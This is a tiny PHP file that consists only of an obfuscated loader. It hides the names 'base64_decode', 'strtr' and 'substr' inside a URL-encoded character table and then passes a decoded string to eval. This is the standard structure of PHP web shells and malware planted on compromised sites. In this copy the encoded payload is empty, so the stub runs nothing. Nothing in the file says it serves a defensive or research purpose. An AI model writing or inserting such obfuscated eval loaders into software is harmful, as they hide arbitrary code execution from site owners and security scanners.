<?php define('PWwmNA0630',__FILE__);$LybBdV=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$dQgvxg=$LybBdV[3].$LybBdV[6].$LybBdV[33].$LybBdV[30];$hZQOdI=$LybBdV[33].$LybBdV[10].$LybBdV[24].$LybBdV[10].$LybBdV[24];$tzLRPT=$hZQOdI[0].$LybBdV[18].$LybBdV[3].$hZQOdI[0].$hZQOdI[1].$LybBdV[24];$eaGnWm=$LybBdV[7].$LybBdV[13];$dQgvxg.=$LybBdV[22].$LybBdV[36].$LybBdV[29].$LybBdV[26].$LybBdV[30].$LybBdV[32].$LybBdV[35].$LybBdV[26].$LybBdV[30];eval($dQgvxg(""));?>